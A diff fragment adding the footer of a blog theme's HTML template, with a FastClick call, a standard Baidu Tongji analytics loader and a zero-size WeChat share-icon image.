+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
